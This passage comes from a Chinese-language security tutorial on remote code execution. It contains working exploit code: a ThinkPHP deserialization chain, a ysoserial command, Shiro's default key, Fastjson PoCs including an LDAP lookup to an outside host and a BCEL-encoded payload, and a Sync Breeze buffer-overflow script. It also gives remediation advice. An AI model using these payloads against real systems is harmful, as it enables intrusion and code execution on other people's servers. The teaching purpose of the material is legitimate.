public function __construct($exp)

{

$this->pool = $exp;

}

}

}

namespace think\log{

class Channel{

protected $logger;

protected $lazy = true;

public function __construct($exp)

{

$this->logger = $exp;

$this->lazy = false;

}

}

}

namespace think{

class Request{

protected $url;

public function __construct()

{

$this->url = '<?php phpinfo(); ?>';

}

}

class App{

protected $instances = [];

public function __construct()

{

$this->instances = ['think\Request'=>new Request()];

}

}

}

namespace think\view\driver{

class Php{}

}

namespace think\log\driver{

class Socket{

protected $config = [];

protected $app;

protected $clientArg = [];

public function __construct()

{

$this->config = [

'debug'=>true,

'force_client_ids' => 1,

'allow_client_ids' => '',

'format_head' => [new \think\view\driver\Php,'display'], # 利用类和方法

];

$this->app = new \think\App();

$this->clientArg = ['tabid'=>'1'];

}

}

}

namespace{

$c = new think\log\driver\Socket();

$b = new think\log\Channel($c);

$a = new League\Flysystem\Cached\Storage\Psr6Cache($b);

echo urlencode(serialize($a));

}

### **3.6.4 JAVA 反序列化**

先进行一次简单的序列化和反序列化的过程，如下，OBjectOutputStream 中 writeObject 是进行序列化的过程，而 readObject 是进行反序列化的过程。并且从写入到 object.dat 文件当中可知，java 序列化的数据不是纯文本格式不可读。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295213-75049ed6-edfe-4521-b3fb-07ad212cec97.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295213-75049ed6-edfe-4521-b3fb-07ad212cec97.png)

Java 进行反序列化 RCE 只用本身的代码较麻烦，这里使用一个通用简单的来演示，因为 java 需要安装依赖才能继续，所以先把大部分项目必备的依赖安装了

commons-beanutils-1.9.4.jar([https://repo1.maven.org/maven2/commons-beanutils/commons-beanutils/1.9.4/commons-beanutils-1.9.4.ja](https://repo1.maven.org/maven2/commons-beanutils/commons-beanutils/1.9.4/commons-beanutils-1.9.4.ja))

commons-collections-3.1.jar([https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar](https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar))

commons-logging-1.1.3.jar([https://repo1.maven.org/maven2/commons-logging/commons-logging/1.1.3/commons-logging-1.1.3.jar](https://repo1.maven.org/maven2/commons-logging/commons-logging/1.1.3/commons-logging-1.1.3.jar))

java 生成 payload 的工具

ysoserial.jar（[https://github.com/frohoff/ysoserial）](https://github.com/frohoff/ysoserial%EF%BC%89)

将依赖都放在项目目录下，并 add to library

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295308-328b5c91-565a-4723-ae9f-f7c7bde7b18b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295308-328b5c91-565a-4723-ae9f-f7c7bde7b18b.png)

使用命令生成 payload

java -jar "ysoserial-all.jar" CommonsBeanutils1 "calc.exe" > 1.ser

访问 index.jsp，可以看出成功弹出计算器，rce 成功

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295549-6635c298-9e90-404b-a56b-3759069b929f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295549-6635c298-9e90-404b-a56b-3759069b929f.png)

### **3.6.5 JAVA 反序列化案例**

为了能够将对象存储起来以便在文件中存储或者在网络上传输，JAVA 提供了序列化机制。在序列化的过程中，会将对象以及对象的属性存储起来。反序列化则会创建对象并给对应的属性赋值。

并不是所有的对象或者属性都可以被序列化，只有实现了 Serializable 的类创建的对象可以被序列化，而且 static 静态变量和 transient 修饰的字段也不会被序列化。因为 static 静态变量是和类相关的, 序列化主要针对的是对象和对象的属性传递，因此不会被序列化。而 transient 修饰字段是因为有一些敏感的内容比如密码不方便保存在文件或者在网络中传输，使用 transient 修饰则可以避免此问题。

JAVA 原生序列化机制主要有两个函数实现，readObject 和 writeObject。调用 writeObject 可实现对象的序列化操作，readObject 则与之相反。在 readObject 构造对象的过程中，会调用一些魔术方法，比如反序列化 HashMap 中会调用 map.put 方法来构造对象，而在 put 的过程中为了检测 key 是否相同，也会自动去调用 equals 方法。我们可以通过构造一个恶意对象并提供特定的属性值来控制反序列化的流程，来实现 RCE 或者其他目的。这种通过控制反序列化过程来实现某种利用的调用过程也叫做反序列化链。

#### **原生反序列化**

常见的反序列化链有 CommonsCollections、CommonsBeanutils、C3P0、FastJson、Jackson 等等，下面我以最常用的 CommonsBeanutils 为例讲讲反序列化链的原理。

首先先带大家分析下 JAVA 反序列化漏洞中一个重要的 sink TemplatesImpl。在该类的 defineTransletClasses 方法中，会从_bytecodes 属性中获取字节数组并通过 defineClass 加载类，并且在 getTransletInstance 中通过 newInstance 创建对象，创建对象的过程中会调用静态代码块和构造方法，因此如果能控制_bytecodes 属性的内容就可以实现任意代码执行。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295759-24a4f681-4911-4be8-911c-17ff7832fdcc.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295759-24a4f681-4911-4be8-911c-17ff7832fdcc.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295865-f7e4b6cc-2552-4b4a-86e8-b74fbae0f971.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169295865-f7e4b6cc-2552-4b4a-86e8-b74fbae0f971.png)

在 TemplatesImpl 中自定义了 readObject 方法，会从序列化内容中获取_bytecodes 属性并赋值。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296055-8026fdde-8ce3-4c98-a87d-73a974ea4bab.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296055-8026fdde-8ce3-4c98-a87d-73a974ea4bab.png)

解决了_bytecodes 的赋值问题还要解决如何调用到 getTransletInstance 的问题，因为 getTransletInstance 为 private 修饰的方法，不能直接调用，因此要在当前 Class 中寻找 getTransletInstance 的调用。在 newTransformer 中找到了 getTransletInstance 的调用且该方法为 public 修饰的。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296236-e632ac7b-cd2a-4986-9d3b-c94aa38c0d60.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296236-e632ac7b-cd2a-4986-9d3b-c94aa38c0d60.png)

理论上来讲只要能控制反序列化的流程走到 newTransformer 即可完成利用，但是很难在一些库中找到直接调用 newTransformer 的操作，因此继续寻找 newTransformer 的调用找到 getOutputProperties 方法，该方法也为 public 修饰并且以 get 开头且参数为空，并且也存在_outputProperties 属性，因此 getOutputProperties 是一个 getter 方法。所以只要能控制反序列化流程执行到 getter 方法，即可完成利用。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296414-cc5854a8-84e8-4372-8fab-80796de442ec.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296414-cc5854a8-84e8-4372-8fab-80796de442ec.png)

BeanComparator 是 Commons-Beanutils 提供的一个 JAVA Bean 的比较器，其作用就是对 JAVA Bean 中的某个属性进行排序或比较，比较操作通过 compare 方法实现，通过下面代码可以看出，compare 会先根据 this.property 属性中的参数调用 PropertyUtils#getProperty 获取属性值后再进一步比较。getProperty 会根据 this.property 作为属性名调用 getter 方法获取对象。因此此处如果传入的 o1 对象为构造好的 TemplatesImpl 对象，this.property 为 outputProperties，在调用 getProperty 方法时就会触发任意代码执行。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296742-a4d2a179-3aae-4c49-8f2f-ff410b7f2784.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296742-a4d2a179-3aae-4c49-8f2f-ff410b7f2784.png)

下面需要控制反序列化的流程到 BeanComparator.compare 中，JAVA 中 PriorityQueue 一种队列数据结构实现，其中根据优先级处理对象。在其进行反序列化时需要恢复队列，而恢复队列时需要根据比较器来对队列中的数据进行排序。

下面我们来分析 PriorityQueue 的反序列化过程，首先读取一个 int 值并作为数组的大小，再根据大小构建一个队列，最后通过 heapify 来排序。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297226-7217c413-2555-441d-89a1-7d3cdf57a91d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297226-7217c413-2555-441d-89a1-7d3cdf57a91d.png)

在 heapify 中，调用 siftDown 将数据插入队列中，siftDown 中判断比较器是否为空，不为空则调用 siftDownUsingComparator 进行排序。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296726-6126a460-5bb9-40dd-ba8f-369568580eba.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169296726-6126a460-5bb9-40dd-ba8f-369568580eba.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297019-6c598ffe-08b6-45a5-aaef-d3587853abca.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297019-6c598ffe-08b6-45a5-aaef-d3587853abca.png)

​ [![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297418-a21927ca-d01a-478e-92b0-5a87245d4b36.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297418-a21927ca-d01a-478e-92b0-5a87245d4b36.png)

在 siftDownUsingComparator 中根据比较器调用 compare 方法比较后插入队列中。comparator 作为一个属性值并且没有 transient 修饰，因此是可控的。我们只要在构建 PriorityQueue 时传入 BeanCompare 作为比较器，同时比较的对象为 TemplatesImpl 对象，即可在反序列化时触发 TemplatesImpl#getOutputProperties 实现 RCE。

最后再看看 ysoserial 中的 CommonsBeanUtils 利用链是不是就比较容易理解了。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297981-08e84efd-cb51-423c-9667-1410828d8889.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297981-08e84efd-cb51-423c-9667-1410828d8889.png)

#### **shiro 反序列化**

shiro 是一款用来进行权限认证和权限管理的框架，可以帮我们完成认证、授权、加密、会话管理、与 Web 集成、缓存等功能。shiro 在实现记住我功能时会将用户的身份信息 principals 序列化后通过 AES 加密后存储在 cookies 中的 rememberMe 字段中，在请求时，会检测 cookies 中是否存在 rememberMe 字段，存在则 AES 解密后再通过 readObject 反序列化后得到 principals 对象。这本身并没有什么问题，但是在 shiro 的低版本中如果用户没有设置 AES 加密的 key，shiro 会提供一个默认的 key。有了 AES key 后我们就可以自己构造恶意对象并通过 AES 加密后通过 cookie 的 rememberMe 字段发送给目标，利用该反序列化漏洞。值得注意的是，有很多程序是在使用 shiro 的开源程序上二开的，并且没有修改开源程序 shiro AES key，我们也可以利用该 key 攻击二开的应用。网上有人总结了常见的 shiro key，实际利用时可以通过 key 字典爆破 shiro key。

shiro 的漏洞核心代码在 AbstractRememberMeManager#convertBytesToPrincipals 中，通过 decrypt 解密 rememberMe 字段中的内容，再通过 deserialize 反序列化。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297832-6ed42df6-819b-448b-8488-66a3352f5b1f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297832-6ed42df6-819b-448b-8488-66a3352f5b1f.png)

decrypt 中通过 getDecryptionCipherKey 获取解密 key 后解密。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297895-0d8eefd3-29dd-48dd-9395-2cbf72d5ff44.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169297895-0d8eefd3-29dd-48dd-9395-2cbf72d5ff44.png)

通过下面代码可以看到 shiro 默认使用的 key 为 kPH+bIxk5D2deZiIxcaaaA==，而且默认的 cipherService 为 AesCipherService。，默认的 serializer 为 DefaultSerializer。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298210-56657737-6dc3-4b18-96b5-c3afb2a79528.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298210-56657737-6dc3-4b18-96b5-c3afb2a79528.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298319-a103ac29-b7e6-4c0b-8e22-dca84f3c077f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298319-a103ac29-b7e6-4c0b-8e22-dca84f3c077f.png)

继续看 deserialize 方法获取 serializer 也就是 DefaultSerializer，调用 DefaultSerializer

#deserialize 方法，调用原生的 java 反序列化。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298485-de2b70be-6925-4792-bd62-d90ce502019e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298485-de2b70be-6925-4792-bd62-d90ce502019e.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298896-32ebbde8-3f14-4c23-aea9-d21837a85b59.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169298896-32ebbde8-3f14-4c23-aea9-d21837a85b59.png)

漏洞修复：

在 shiro 高版本中不再使用默认密钥，用户没有配置密钥则会随机生成密钥，也就是说 shiro 并没有修复反序列化本身，而是通过增加密钥的随机性来防御漏洞。在实战中如果能通过 heapdump 等手段从内存中获取 shiro key 或者从源码中得到用户自定义的 shiro key 仍然能利用反序列化 RCE。

#### **Fastjson 反序列化漏洞**

Fastjson 是一款常用的国产 JSON 解析组件，其在 github 上已经获取了 25.6k star，在很多代码中都有引用。Fastjson 可以把对象通过 JSON#toJSONString 序列化为 JSON 格式的 String。也可以通过 JSON#parseObject 将 string 反序列化为对象。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299123-a64f2cb9-256c-474f-9437-d43a1322707c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299123-a64f2cb9-256c-474f-9437-d43a1322707c.png)

但是这样有一个问题，在 JSON 序列化的 string 中是看不到 User 的类型信息的，那样在反序列化的时就仅仅根据 JSON string 是不知道对象类型的，也就无法反序列化出正确的对象。因此 fastjson 在序列化是提供了 SerializerFeature.WriteClassName 属性，可以将对象类型序列化到 json 字符串中。通过 @type 字段来表示对象的类型信息。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299198-d2860361-1811-4a7d-92fa-d9a94e97a509.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299198-d2860361-1811-4a7d-92fa-d9a94e97a509.png)

在 fastjson 1.2.24 之前，fastjson 在反序列化时不会限制要反序列化的类型，因此我们可以通过构造 @type 字段来让 fastjson 反序列化任意 Class，并且在反序列化对象时会调用 Class 的 setter 方法设置对象的属性，这给了我们漏洞利用的空间。

**JdbcRowSetImpl**

JdbcRowSetImpl 是一个非常经典的 setter 利用链，通过该链可以触发 JNDI 漏洞实现 RCE。

首先还是看漏洞的 sink, 在 com.sun.rowset.JdbcRowSetImpl#connect 方法中，漏洞点在 InitialContext#lookup，后面我们学了 JNDI 会知道，这是个非常明显的 JNDI 漏洞 sink 点，能控制 lookup 的参数就可以向恶意服务器发起 ldap 请求触发 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299264-494f503f-99b3-4381-9ff7-db608a8d4a4e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299264-494f503f-99b3-4381-9ff7-db608a8d4a4e.png)

所以下面要解决两个问题，dataSource 属性能否控制、如何通过 setter 方法调用到 connect。由于 dataSource 存在 setter 方法，而 fastjson 在反序列化时会调用 setter 方法给属性赋值，因此 dataSource 属性可控。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299285-4bf5ed47-a400-49b2-a6ea-967ecbfbf5f2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299285-4bf5ed47-a400-49b2-a6ea-967ecbfbf5f2.png)

在 setAutoCommit 中调用了 connect 方法，所以可以通过设置 autoCommit 字段触发 setAutoCommit 利用。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299702-b33dc75f-72a3-40a3-b313-d9af2130192c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299702-b33dc75f-72a3-40a3-b313-d9af2130192c.png)

Poc 如下：

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.93.1:9999/a","autoCommit":true}

在 fastjson 中除了可以触发 setter 方法实现 RCE，在某些特定的场景下也可以触发 getter 方法实现 RCE。比如当构建的 json key 是一个 JSONObject 对象，则在执行反序列化过程中会调用 JSONObject.toString() 方法，该方法调用会触发 getter 操作，因此 fastjson 反序列化也可以通过触发 getter 方法实现 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299892-9aab2373-a6da-4cdd-bedd-821911c97865.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299892-9aab2373-a6da-4cdd-bedd-821911c97865.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299862-43df4cb0-7a52-4a1b-9f5e-52695149774e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169299862-43df4cb0-7a52-4a1b-9f5e-52695149774e.png)

下面带大家分析一个 getter 利用链 BasicDataSource，首先看漏洞的 sink，Class.forName 中，driverClassName 和 driverClassLoader 均为用户可控，且存在 setter 方法，因此可以通过控制 driverClassLoader 为 bcelClassLoader, 而 driverClassName 为 bcel 编码的 class 类，在执行 class.forName 的过程中加载该类并初始化，会调用其 static 静态方法，因此可以在 bcel class 的静态代码块中写入恶意代码实现任意代码执行。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300022-e07b7177-c32a-4108-aa15-4fd9866ab8c5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300022-e07b7177-c32a-4108-aa15-4fd9866ab8c5.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300217-c337064a-4c46-4e82-b5b9-86db590e11fb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300217-c337064a-4c46-4e82-b5b9-86db590e11fb.png)

继续分析如何触发到 createConnectionFactory，经过分析只要能触发到 getConnection 方法即可触发漏洞，在 JSONObject#toString 的过程中会调用所有的 getter 方法，因此可以通过 getConnection 触发 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300672-995d2703-652b-406e-a8ea-643bda181aec.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300672-995d2703-652b-406e-a8ea-643bda181aec.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300730-4cbd11ff-17e3-43fd-a3f2-cbd4fb3c3bfc.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300730-4cbd11ff-17e3-43fd-a3f2-cbd4fb3c3bfc.png)

漏洞 POC 如下：

{

{

"@type":"com.alibaba.fastjson.JSONObject",

'a':

{

"@type":"org.apache.tomcat.dbcp.dbcp.BasicDataSource",

'driverClassLoader':

{

"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"

},

'driverClassName':'$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$92$cdN$c2$40$Q$c7$ff$8b$z$c5ZAQ$f1$5bQ$_$c8A$S$af$g$_$7e$q$u$ea$B$c2$d1d$v$ab$UK$db$y$8b$f1$R$7c$T$cf$5e$d4x$f0$B$7c$u$e3$ec$8a$Y$_n$d2$99$ee$7fv$7e3$9d$ed$c7$e7$db$3b$80$5dl$ba$c8$60$de$86Y3$P$$$W$b0$e8$60$c9$85$8de$H$x$OV$Z$d2$fbA$U$a8$D$86$b1$d2v$93$c1$3a$8c$db$82$nW$L$oq1$e8$b5$84l$f0VHJ$be$W$fb$3clr$Z$e8$fdP$b4T$t$e83L$d4$ea$a1$Q$c9$91$e8$c5$7b$M$99$7d$3f$i2$Z$9d$v$d6$ba$fc$8eWB$k$ddT$aa$91$SR$O$S$r$da$c7$f7$beHT$QG$941YW$dc$bf$3d$e7$89$c1R$87$Mn$3d$kH_$9c$E$ba$cc$d6$I$bf$a3Y$c5k$Z$f7$8a$d5$u$Z$u$j$bflu$85$af$3c$8c$c3u$b0$e6a$jE$86$b5$ff$8bz$d8$80$cb0$3e$C3L$fdf$7c$T$ffH$8d$8e$U$bc$cd$60$f7u$G$7dy$e9T$8f$x$97$c8$mR$a6$fd$86$e4$be$m$acC3$d7$x$F$a6$5b$o$3bA$bb$KyF$de$$$bf$80$3d$99$b0G6mD$9a$AY$ef$fb$A$b2$c8$91$cf$60j$94$7ce$60$40n$W$a9WX$8f$c8$9c$95$9f$91$7e2b$9a$aa$d8$Y3$b8$C$f4e$5b$a49Fu$e9$zK$a8$l$bcK$b1i$e4$f5$df$40$8f$83T$d5$c1$acE$819$d3Q$e1$L$xnB$m$3a$C$A$A'

}

}:'b'

}

### **3.6.6 修复 / 预防方案**

尽量用高版本 JDK，因为禁了 RMI Codebase / TemplatesImpl （JDK17） 等危险的类

使用白名单机制限制可反序列化的类和对象类型，只允许已知、受信任的类进行反序列化。确保白名单列表具有最小化的权限，即只包含必需的类和对象。

重写 ObjectInputStream 的 resolveClass 方法对即将序列化的对象进行校验（在反序列化之前进行）

**3.7 缓冲区溢出导致 RCE**
-------------------

缓冲区溢出漏洞是一个历史非常悠久的漏洞种类，1988 年由康奈尔大学学生罗伯特 · 泰潘 · 莫里斯所编写的莫里斯蠕虫，其中就利用了多个缓冲区漏洞来帮助自身感染和传播。

缓冲区溢出漏洞本质上是因为程序没有对用户的输入进行合理的校验，导致了超过缓冲区长度的数据被拷贝至内存，从而影响了程序本身的正常运行。

时至今日，该漏洞已经远不如以前常见了，一方面是各类高级编程语言的兴起，使得开发者不必手动管理内存，也就不会出现设计失误导致的溢出漏洞；另一方面则是操作系统从底层不断添加了各种缓解措施，例如 Windows 上的 DEP、CFG、ASLR 等，Linux 上的 Stack canary、No eXecute、PIE 等，使得漏洞完整利用越来越难。

本章我们就以 Windows x86 上最基本的缓冲区溢出为例，带大家体验一下 Binary Exploitation 的魅力。

### **3.7.1 缓冲区溢出基础方式**

我们先来看一段代码：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300763-67dd54d3-f062-44ee-bfe2-7721104c7937.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300763-67dd54d3-f062-44ee-bfe2-7721104c7937.png)

很明显，这是一段存在缓冲区溢出漏洞的代码，当我们输入的参数在大于 64 个字符时，就会发生缓冲区溢出。

下图则是当我们输入不同长度字符，导致这个应用程序正常或异常时，内存堆栈的状态：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300853-e4b8ea2f-08a9-4e16-9682-d49bd0779789.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300853-e4b8ea2f-08a9-4e16-9682-d49bd0779789.png)

输入字符过长，就会覆盖其他的内存空间，对于 x86 程序，EIP 寄存器所指向的就是下一条指令对应的内存地址，所以最基础的缓冲区溢出利用就需要控制 EIP 的值，然后使其指向我们的 shellcode 以获取 shell.

### **3.7.2 缓冲区溢出 RCE 案例**

下面我们来看一个案例：Sync Breeze Enterprise 10.0.28 远程缓冲区溢出漏洞，漏洞的 EXP 可以在这里找到：[https://www.exploit-db.com/exploits/42928，我们再给出一个 Crash](https://www.exploit-db.com/exploits/42928%EF%BC%8C%E6%88%91%E4%BB%AC%E5%86%8D%E7%BB%99%E5%87%BA%E4%B8%80%E4%B8%AACrash) PoC：

#!/usr/bin/python  
import socket  
import sys

try:  
server = sys.argv[1]  
port = 80  
size = 5000  
inputBuffer = b"A" * size  
content = b"user

buffer = b"POST /login HTTP/1.1\r\n"  
buffer += b"Host:" + server.encode() + b"\r\n"  
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"  
buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8\r\n"  
buffer += b"Accept-Language: en-US,en;q=0.5\r\n"  
buffer += b"Referer: [http://10.11.0.22/login\r\n](http://10.11.0.22/login/r/n)"

buffer += b"Connection: close\r\n"  
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"  
buffer += b"Content-Length:"+ str(len(content)).encode() + b"\r\n"  
buffer += b"\r\n"  
buffer += content

print("Sending evil buffer...")  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((server, port))  
s.send(buffer)  
s.close()

print("Done!")

except socket.error:  
print("Could not connect!")

对于基础的缓冲区漏洞利用，我们分为以下 5 步进行：

1.  获取偏移量
2.  存入 shellcode
3.  去除坏字符
4.  执行流程重定向
5.  获得反向 shell

**1 获取偏移量**

当我们有了一个基础的 Crash PoC 时，执行后能够看到 EIP 被我们发送的值覆盖：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300996-d09fb31c-b91a-4a87-ae6e-9f7de6aa0f34.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169300996-d09fb31c-b91a-4a87-ae6e-9f7de6aa0f34.png)

这代表我们能够控制 EIP 的值，但要想更加精确地操纵，就得计算出具体哪一段的字符覆盖了 EIP，即计算偏移量。

一个很方便的工具是 msf 的 pattern_create.rb 脚本，可以用它生成不重复的字符串，以用来定位。

msf-pattern_create -l 800

将其生成的结果替换掉脚本中发送的 Payload，运行后可以看到：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301448-e27dfc2c-da5c-46ac-a318-ce1946cbc2c0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301448-e27dfc2c-da5c-46ac-a318-ce1946cbc2c0.png)

eip=42306142，转换一下得到：b0Ab，可以手动定位到它在字符串的 33-36 位。

也可以利用 msf-pattern_offset 来帮你完成这项工作：

msf-pattern_offset -l 800 -q 42306142

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301448-f5d91341-a0a9-4738-9a29-5ad2f88e79b7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301448-f5d91341-a0a9-4738-9a29-5ad2f88e79b7.png)

现在我们知道了偏移量为 780.

**2 存入 shellcode**

下一步我们要将 shellcode 存入缓冲区，先确认下是否有足够的空间来存放。

可以发现，当触发崩溃时，esp 中的地址为 01d3745c，指向的内容是被我们的 C（\x43）字符覆盖的：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301516-0bd55ba8-f06b-4623-9842-097868f899c3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301516-0bd55ba8-f06b-4623-9842-097868f899c3.png)

那么现在我们增大输入数据的总长度，重新测试：

filler = b"A" * 780

eip = b"B" * 4

buf = b"C" * 4

shellcode = b"D" * (1500 - 788)

inputBuffer = filler + eip + buf + shellcode

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301608-95c5cc33-0e56-487c-b5b7-6bde4ccc0199.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301608-95c5cc33-0e56-487c-b5b7-6bde4ccc0199.png)

Shellcode 一般不会超过 400 字节，这里的缓冲区是足够大的。

但还有一个问题，我们不能直接用现在 ESP 的值来定位 shellcode，因为 ESP 的地址会经常发生变化。

​ 如何解决该问题，我们留在后面讨论。

**3 去除坏字符**

坏字符会破坏原本的 shellcode 功能，例如空字节（0x00），会被 C/C++ 认为是字符串的结尾，那么就会截断缓冲区。

在这个案例中，我们还应该避免 0x0D，因为它会被认为是 HTTP 请求字段的结尾，导致发生截断。

一种寻找坏字符的方法是，发送所有可能的字符，观察应用程序崩溃后对这些字符的反应，造成截断的就是坏字符：

filler = b"A" * 780

eip = b"B" * 4

offset = b"C" * 4

badchars = (

b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"

b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"

b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"

b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"

b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"

b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"

b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"

b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"

b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"

b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"

b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"

b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"

b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"

b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"

b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"

b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

inputBuffer = filler + eip + offset + badchars

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301834-ec0d7c25-3525-4513-92ba-e810273b77eb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169301834-ec0d7c25-3525-4513-92ba-e810273b77eb.png)

0x0A 作为换行符，在这里也是坏字符，删掉后继续重复该流程，最终得到坏字符为：0x00、0x0A、0x0D、0x25、0x26、0x2B、0x3D

**4 执行流程重定向**

现在我们回到之前的那个问题，怎么定位 shellcode 所在的位置？将 ESP 值硬编码进脚本再用它覆盖 EIP 的值，这种方法肯定是行不通的，原因我们已经解释过。

所以另一种解决方案，我们将利用 jmp 指令，跳转到 ESP 所指向的地址，这样得到的值就是准确的，避免了 “刻舟求剑” 式的错误。

